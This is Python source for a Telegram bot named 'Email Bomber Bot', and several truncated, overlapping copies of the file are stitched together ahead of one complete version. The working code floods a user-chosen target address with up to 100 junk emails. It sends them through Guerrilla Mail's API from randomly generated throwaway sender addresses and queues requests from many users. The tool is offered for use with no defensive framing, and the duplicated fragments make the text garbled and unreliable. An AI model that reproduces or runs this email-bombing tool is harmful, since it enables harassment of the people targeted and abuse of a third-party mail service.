5tr(len(queue))
    else:
        msg = PREFIX + "No settings yet.
Queue: " + str(len(queue))
    bot.reply_to(message, msg)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, PREFIX + "Operation stopped.")
    else:
        bot.reply_to(message, PREFIX + "No active operation found.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, PREFIX + "All settings cleared.")


print("Bot starting...")
bot.infinity_polling(skip_pending=True, none_stop=True)           )
            break
        pos += 1
    if not found:
        bot.reply_to(message, "✉️ Email Bomber Bot
You are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    old_len = len(queue)
    queue = deque([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "✉️ Email Bomber Bot
✅ Removed from queue.")
    else:
        bot.reply_to(message, "✉️ Email Bomber Bot
You were not in the queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "✉️ Email Bomber Bot - Status

"
    if uid in user_data:
        d = user_data[uid]
        text += "Target: " + str(d.get('target', 'not set')) + "
"
        text += "Count: " + str(d.get('count', 'not set')) + "
"
        text += "Interval: " + str(d.get('interval', 3)) + " seconds
"
    else:
        text += "No settings configured.
"
    text += "
Active operation: " + ("Yes" if current_operation else "No") + "
"
    text += "Queue length: " + str(len(queue))
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "✉️ Email Bomber Bot
U0001f6d1 Current operation stopped.")
    else:
        bot.reply_to(message, "✉️ Email Bomber Bot
No active operation to stop or not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "✉️ Email Bomber Bot
✅ All settings cleared.")


print("Email Bomber Bot starting on Render...")
bot.infinity_polling(skip_pending=True, none_stop=True)ue([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "✉️ Email Bomber Bot
✅ Removed from queue.")
    else:
        bot.reply_to(message, "✉️ Email Bomber Bot
You were not in the queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "✉️ Email Bomber Bot — Status

"
    if uid in user_data:
        d = user_data[uid]
        text += f"Target: {d.get('target', 'not set')}
"
        text += f"Count: {d.get('count', 'not set')}
"
        text += f"Interval: {d.get('interval', 3)} seconds
"
    else:
        text += "No settings configured.
"
    text += f"
Active operation: {'Yes' if current_operation else 'No'}
"
    text += f"Queue length: {len(queue)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "✉️ Email Bomber Bot
🛑 Current operation stopped.")
    else:
        bot.reply_to(message, "✉️ Email Bomber Bot
No active operation to stop, or it's not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "✉️ Email Bomber Bot
✅ All settings cleared.")


print("Email Bomber Bot starting on Render...")
print("Flask keep-alive thread started – waiting for bind...")
bot.infinity_polling(skip_pending=True, none_stop=True)he queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    old_len = len(queue)
    queue = deque([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nRemoved from queue.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou were not in queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "Welcome to the Email Bomber Bot\n"
    if uid in user_data:
        d = user_data[uid]
        text += f"Target: {d.get('target', 'not set')}\nCount: {d.get('count', 'not set')}\nInterval: {d.get('interval', 3)} seconds\n"
    else:
        text += "No settings configured.\n"
    if current_operation:
        text += "Operation in progress.\n"
    text += f"Queue length: {len(queue)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nCurrent operation stopped.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nNo active operation to stop or not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "Welcome to the Email Bomber Bot\nAll settings cleared.")

print("Email Bomber Bot starting on Render...")
print("Flask keep-alive thread started – waiting for bind...")
bot.infinity_polling(skip_pending=True, none_stop=True)
def queue_cmd(message):
    if not queue:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nQueue is empty.")
        return
    uid = message.from_user.id
    pos = 1
    found = False
    for req in queue:
        if req['user_id'] == uid:
            found = True
            bot.reply_to(message, f"Welcome to the Email Bomber Bot\nYour position: {pos} of {len(queue)}\nTarget: {req['target']}\nCount: {req['count']}")
            break
        pos += 1
    if not found:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    old_len = len(queue)
    queue = deque([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nRemoved from queue.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou were not in queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "Welcome to the Email Bomber Bot\n"
    if uid in user_data:
        d = user_data[uid]
        text += f"Target: {d.get('target', 'not set')}\nCount: {d.get('count', 'not set')}\nInterval: {d.get('interval', 3)} seconds\n"
    else:
        text += "No settings configured.\n"
    if current_operation:
        text += "Operation in progress.\n"
    text += f"Queue length: {len(queue)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nCurrent operation stopped.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nNo active operation to stop or not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "Welcome to the Email Bomber Bot\nAll settings cleared.")

print("Email Bomber Bot starting on Render...")
print("Flask keep-alive server thread started – waiting for bind confirmation...")
bot.infinity_polling(skip_pending=True, none_stop=True)omber Bot\nYou are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    old_len = len(queue)
    queue = deque([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nRemoved from queue.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou were not in queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "Welcome to the Email Bomber Bot\n"
    if uid in user_data:
        d = user_data[uid]
        text += f"Target: {d.get('target', 'not set')}\nCount: {d.get('count', 'not set')}\nInterval: {d.get('interval', 3)} seconds\n"
    else:
        text += "No settings configured.\n"
    if current_operation:
        text += "Operation in progress.\n"
    text += f"Queue length: {len(queue)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nCurrent operation stopped.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nNo active operation to stop or not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "Welcome to the Email Bomber Bot\nAll settings cleared.")

print("Email Bomber Bot starting...")
bot.infinity_polling()
import telebot
import requests
import random
import string
import time
import threading
from collections import deque
from datetime import datetime
from flask import Flask
import os

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is alive!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()
time.sleep(2)

bot = telebot.TeleBot(BOT_TOKEN)

bomb_lock = threading.Lock()
current_operation = None
queue = deque()
user_data = {}

P = "[ Email Bomber Bot ]
"

DOMAINS = [
    "sharklasers.com",
    "grr.la",
    "guerrillamail.com",
    "guerrillamail.de",
    "guerrillamail.net",
    "guerrillamail.org",
    "guerrillamail.biz"
]

def rand_email():
    u = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return u + "@" + random.choice(DOMAINS)

def rand_subject():
    w = ["Signal", "Drop", "Echo", "Void", "Pulse", "Noise"]
    return random.choice(w) + " #" + str(random.randint(1000, 9999))

def rand_body():
    t = [
        "Random transmission received. No origin detected.",
        "Pointless data packet delivered to inbox.",
        "Clutter level increased by one unit.",
        "Null message arrived for no reason.",
        "Entropy injection complete."
    ]
    f = "".join(random.choices(string.ascii_letters + string.digits + " .,!?", k=random.randint(30, 80)))
    return random.choice(t) + " " + f

def send_email(to, subject, body):
    try:
        s = requests.Session()
        r = s.get("https://api.guerrillamail.com/ajax.php?f=get_email_address", timeout=10)
        sid = r.json().get("sid_token")
        if not sid:
            return False
        payload = {
            "f": "send_email",
            "sid_token": sid,
            "to": to,
            "from": rand_email(),
            "subject": subject,
            "body": body
        }
        res = s.post("https://api.guerrillamail.com/ajax.php", data=payload, timeout=10)
        return res.json().get("status") == "sent"
    except Exception as e:
        print("Error: " + str(e))
        return False

def run_bomb():
    global current_operation
    op = current_operation
    cid = op["chat_id"]
    uid = op["user_id"]
    sent = 0
    fails = 0

    bot.send_message(cid, P + "Started!
To: " + op["target"] + "
Count: " + str(op["count"]) + "
Delay: " + str(op["interval"]) + "s")

    t0 = datetime.now()

    for i in range(op["count"]):
        if current_operation is None or current_operation["user_id"] != uid:
            break

        ok = send_email(op["target"], rand_subject(), rand_body())
        if ok:
            sent += 1
            fails = 0
        else:
            fails += 1

        if fails >= 3:
            bot.send_message(cid, P + "Stopped early (API limit).
Sent: " + str(sent) + "/" + str(op["count"]))
            break

        if (i + 1) % 5 == 0:
            elapsed = (datetime.now() - t0).total_seconds()
            if elapsed > 0:
                rate = (i + 1) / elapsed
                rem = op["count"] - (i + 1)
                eta = rem / rate if rate > 0 else rem * op["interval"]
                em = int(eta // 60)
                es = int(eta % 60)
                bot.send_message(cid, P + "Progress: " + str(sent) + "/" + str(op["count"]) + "
ETA: " + str(em) + "m " + str(es) + "s")

        time.sleep(op["interval"])

    bot.send_message(cid, P + "Done! Sent: " + str(sent) + "/" + str(op["count"]))
    current_operation = None

    if queue:
        nxt = queue.popleft()
        current_operation = nxt.copy()
        current_operation["sent"] = 0
        current_operation["start_time"] = datetime.now()
        threading.Thread(target=run_bomb).start()
        bot.send_message(nxt["chat_id"], P + "Your turn started!
To: " + nxt["target"] + "
Count: " + str(nxt["count"]))


@bot.message_handler(commands=["start"])
def cmd_start(message):
    bot.reply_to(message, P + "Welcome!
Sends random emails from temp addresses.
Max ~20-50 per session.

Type /help for commands.")

@bot.message_handler(commands=["help"])
def cmd_help(message):
    h = P + "Commands:
"
    h += "/target <email>   - Set target
"
    h += "/count <1-100>    - Set message count
"
    h += "/interval <3-30>  - Set delay (seconds)
"
    h += "/bomb             - Start bombing
"
    h += "/status           - View your settings
"
    h += "/queue            - Check queue position
"
    h += "/cancel           - Leave the queue
"
    h += "/stop             - Stop active operation
"
    h += "/reset            - Clear all settings"
    bot.reply_to(message, h)

@bot.message_handler(commands=["target"])
def cmd_target(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            raise ValueError
        email = parts[1].strip()
        if "@" not in email or "." not in email.split("@")[-1]:
            bot.reply_to(message, P + "Invalid email.
Example: user@domain.com")
            return
        uid = message.from_user.id
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]["target"] = email
        bot.reply_to(message, P + "Target set: " + email + "
Next: /count <number>")
    except Exception:
        bot.reply_to(message, P + "Usage: /target email@example.com")

@bot.message_handler(commands=["count"])
def cmd_count(message):
    try:
        n = int(message.text.split()[1])
        if not 1 <= n <= 100:
            raise ValueError
        uid = message.from_user.id
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]["count"] = n
        bot.reply_to(message, P + "Count set to: " + str(n))
    except Exception:
        bot.reply_to(message, P + "Usage: /count 20  (1 to 100)")

@bot.message_handler(commands=["interval"])
def cmd_interval(message):
    try:
        sec = int(message.text.split()[1])
        if not 3 <= sec <= 30:
            raise ValueError
        uid = message.from_user.id
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]["interval"] = sec
        bot.reply_to(message, P + "Delay set to: " + str(sec) + " seconds")
    except Exception:
        bot.reply_to(message, P + "Usage: /interval 5  (3 to 30 seconds)")

@bot.message_handler(commands=["bomb"])
def cmd_bomb(message):
    uid = message.from_user.id
    if uid not in user_data or "target" not in user_data[uid] or "count" not in user_data[uid]:
        bot.reply_to(message, P + "Set /target and /count first.")
        return
    iv = user_data[uid].get("interval", 3)
    tg = user_data[uid]["target"]
    ct = user_data[uid]["count"]
    txt = P + "Confirm?
To: " + tg + "
Count: " + str(ct) + "
Delay: " + str(iv) + "s

Reply YES to start."
    msg = bot.reply_to(message, txt)
    bot.register_next_step_handler(msg, lambda m: confirm_handler(m, uid, message.chat.id, tg, ct, iv))

def confirm_handler(message, uid, chat_id, target, count, interval):
    if message.text.strip().upper() != "YES":
        bot.reply_to(message, P + "Cancelled.")
        return
    global current_operation
    with bomb_lock:
        if current_operation:
            queue.append({"user_id": uid, "target": target, "count": count, "interval": interval, "chat_id": chat_id})
            bot.reply_to(message, P + "Added to queue. Position: " + str(len(queue)) + "
Use /queue to check.")
        else:
            current_operation = {"user_id": uid, "target": target, "count": count, "interval": interval, "sent": 0, "start_time": datetime.now(), "chat_id": chat_id}
            threading.Thread(target=run_bomb).start()

@bot.message_handler(commands=["queue"])
def cmd_queue(message):
    uid = message.from_user.id
    if not queue:
        bot.reply_to(message, P + "Queue is empty.")
        return
    pos = 1
    found = False
    for req in queue:
        if req["user_id"] == uid:
            found = True
            bot.reply_to(message, P + "Position: " + str(pos) + " of " + str(len(queue)) + "
To: " + req["target"] + "
Count: " + str(req["count"]))
            break
        pos += 1
    if not found:
        bot.reply_to(message, P + "You are not in the queue.")

@bot.message_handler(commands=["cancel"])
def cmd_cancel(message):
    global queue
    uid = message.from_user.id
    old = len(queue)
    queue = deque([r for r in queue if r["user_id"] != uid])
    if len(queue) < old:
        bot.reply_to(message, P + "Removed from queue.")
    else:
        bot.reply_to(message, P + "You were not in the queue.")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    uid = message.from_user.id
    if uid in user_data:
        d = user_data[uid]
        txt = P + "Target: " + str(d.get("target", "not set")) + "
Count: " + str(d.get("count", "not set")) + "
Interval: " + str(d.get("interval", 3)) + "s
Active: " + ("Yes" if current_operation else "No") + "
Queue: " + str(len(queue))
    else:
        txt = P + "No settings yet.
Queue: " + str(len(queue))
    bot.reply_to(message, txt)

@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation["user_id"] == uid:
        current_operation = None
        bot.reply_to(message, P + "Operation stopped.")
    else:
        bot.reply_to(message, P + "No active operation found.")

@bot.message_handler(commands=["reset"])
def cmd_reset(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, P + "All settings cleared.")


print("Bot starting on Render...")
bot.infinity_polling(skip_pending=True, none_stop=True)
